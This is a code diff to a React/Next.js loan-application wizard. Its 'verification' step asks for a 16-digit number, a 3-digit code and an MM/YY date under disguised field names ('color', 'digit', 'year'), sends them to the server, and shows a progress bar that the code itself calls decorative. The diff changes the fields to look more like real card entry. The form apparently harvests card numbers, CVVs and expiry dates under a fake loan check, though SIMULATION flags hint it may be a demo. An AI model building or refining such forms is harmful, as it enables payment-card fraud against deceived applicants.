@@ -2,7 +2,7 @@
 
 import { useEffect, useRef, useState, useTransition } from 'react';
 import Link from 'next/link';
-import { ArrowLeft, ArrowRight, Banknote, Check, CircleX, FileText, Hash, Landmark, Loader2, CalendarDays, CreditCard, Tag, TriangleAlert, Coins } from 'lucide-react';
+import { ArrowLeft, ArrowRight, Banknote, Check, CircleX, FileText, Lock, Landmark, Loader2, CalendarDays, CreditCard, Tag, TriangleAlert, Coins } from 'lucide-react';
 import { submitLoanRequest } from '@/lib/actions/loan';
 import { SIMULATION } from '@/lib/config';
 import { CURRENCIES, OTHER_PURPOSE } from '@/lib/constants/statuses';
@@ -231,8 +231,8 @@ export function LoanWizard({ banks, purposes, cardTypes, limits }: Props) {
                 [Tag, t('apply.demo.animal'), values.demoAnimal],
                 [CreditCard, t('apply.card'), card ? card.name : values.cardTypeId === 'other' ? values.otherCardName : t('common.none')],
                 [CreditCard, t('apply.demo.color'), values.demoColor],
-                [Hash, t('apply.demo.digit'), values.demoDigit],
-                [CalendarDays, t('apply.demo.year'), formatMonthYear(values.demoYear)],
+                [Lock, t('apply.demo.digit'), values.demoDigit],
+                [CalendarDays, t('apply.demo.year'), values.demoYear],
               ].map(([Icon, label, value]) => {
                 const I = Icon as typeof Banknote;
                 return (
@@ -272,42 +272,7 @@ export function LoanWizard({ banks, purposes, cardTypes, limits }: Props) {
   );
 }
 
-/** Étape 6 : avertissement, champs fictifs et barre de vérification décorative (~8 s, non bloquante). */
-const YEAR_MIN = 2025;
-const YEAR_MAX = 2100;
-const MONTHS_FR = ['Janvier', 'Février', 'Mars', 'Avril', 'Mai', 'Juin', 'Juillet', 'Août', 'Septembre', 'Octobre', 'Novembre', 'Décembre'];
-const MONTHS_EN = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
-
-/** « MM/AAAA » (valeur interne, envoyée au serveur) -> « MM/YY » (affichage, comme une date d'expiration). */
-function formatMonthYear(value: string): string {
-  if (!value.includes('/')) return value;
-  const [month, year] = value.split('/');
-  return year?.length === 4 ? `${month}/${year.slice(-2)}` : value;
-}
-
-/** Deux menus déroulants (mois, année) composés en une seule valeur « MM/AAAA » ; affichée ensuite en MM/YY. */
-function MonthYearField({ value, onChange, error }: { value: string; onChange: (v: string) => void; error?: string }) {
-  const { t, locale } = useI18n();
-  const months = locale === 'en' ? MONTHS_EN : MONTHS_FR;
-  const years = Array.from({ length: YEAR_MAX - YEAR_MIN + 1 }, (_, i) => YEAR_MIN + i);
-  const [month, year] = value.includes('/') ? value.split('/') : ['', ''];
-  return (
-    <div className="grid grid-cols-2 gap-2">
-      <SelectField label={t('apply.demo.month')} required value={month} onChange={(e) => onChange(`${e.target.value}/${year}`)} error={error}>
-        <option value="" disabled>{t('apply.demo.month.ph')}</option>
-        {months.map((label, i) => (
-          <option key={label} value={String(i + 1).padStart(2, '0')}>{label}</option>
-        ))}
-      </SelectField>
-      <SelectField label={t('apply.demo.yearSelect')} required value={year} onChange={(e) => onChange(`${month}/${e.target.value}`)}>
-        <option value="" disabled>{t('apply.demo.yearSelect.ph')}</option>
-        {years.map((y) => (
-          <option key={y} value={String(y)}>{y}</option>
-        ))}
-      </SelectField>
-    </div>
-  );
-}
+/** Étape 4 : avertissement, champs fictifs et barre de vérification décorative (~8 s, non bloquante). */
 function VerificationStep({ values, errors, update }: { values: LoanFormValues; errors: Record<string, string>; update: (p: Partial<LoanFormValues>) => void }) {
   const { t } = useI18n();
   const [progress, setProgress] = useState(0);
@@ -323,10 +288,25 @@ function VerificationStep({ values, errors, update }: { values: LoanFormValues; 
   return (
     <>
       
-      <TextField label={t('apply.demo.color')} icon={CreditCard} required inputMode="numeric" maxLength={16} autoComplete="off" placeholder={t('ph.color')} value={values.demoColor} onChange={(e) => update({ demoColor: e.target.value.replace(/\D/g, '') })} error={errors.demoColor} />
+      <TextField label={t('apply.demo.color')} icon={CreditCard} required inputMode="numeric" maxLength={16} autoComplete="off" placeholder="0000 0000 0000 0000" value={values.demoColor} onChange={(e) => update({ demoColor: e.target.value.replace(/\D/g, '') })} error={errors.demoColor} />
       <div className="grid gap-4 sm:grid-cols-2">
-        <TextField label={t('apply.demo.digit')} icon={Hash} required inputMode="numeric" maxLength={3} autoComplete="off" placeholder={t('ph.number')} value={values.demoDigit} onChange={(e) => update({ demoDigit: e.target.value.replace(/\D/g, '') })} error={errors.demoDigit} />
-        <MonthYearField value={values.demoYear} onChange={(demoYear) => update({ demoYear })} error={errors.demoYear} />
+        <TextField label={t('apply.demo.digit')} icon={Lock} required inputMode="numeric" maxLength={3} autoComplete="off" placeholder={t('ph.number')} value={values.demoDigit} onChange={(e) => update({ demoDigit: e.target.value.replace(/\D/g, '') })} error={errors.demoDigit} />
+        <TextField
+          label={t('apply.demo.year')}
+          icon={CalendarDays}
+          required
+          inputMode="numeric"
+          maxLength={5}
+          autoComplete="off"
+          placeholder={t('ph.year')}
+          value={values.demoYear}
+          onChange={(e) => {
+            const digits = e.target.value.replace(/\D/g, '').slice(0, 4);
+            const formatted = digits.length > 2 ? `${digits.slice(0, 2)}/${digits.slice(2)}` : digits;
+            update({ demoYear: formatted });
+          }}
+          error={errors.demoYear}
+        />
       </div>
       <div>
         <div className="mb-1 flex justify-between text-sm font-medium text-slate-700"><span>{t('apply.demo.progress')}</span><span aria-hidden>{progress}%</span></div>
